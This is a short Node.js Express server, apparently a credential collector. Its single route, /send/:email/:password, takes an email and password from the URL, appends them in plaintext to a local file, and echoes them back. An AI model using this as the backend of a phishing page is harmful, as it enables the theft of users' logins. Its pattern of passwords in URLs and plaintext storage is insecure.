const express = require('express')
const fs = require('fs')

const app = express();
const port = 5000;

const doc = fs.createWriteStream('doc.txt')
doc.write('file created!\n')

app.get('/send/:email/:password', (req, res) => {
    console.log('loading...')
    doc.write(`email: ${req.params.email}\npassword: ${req.params.password}\n\n`)
    res.send('sent ' + req.params.email + 'and ' + req.params.password);

});

app.listen(port, () =>
  console.log(`Example app listening on port ${port}!`),
);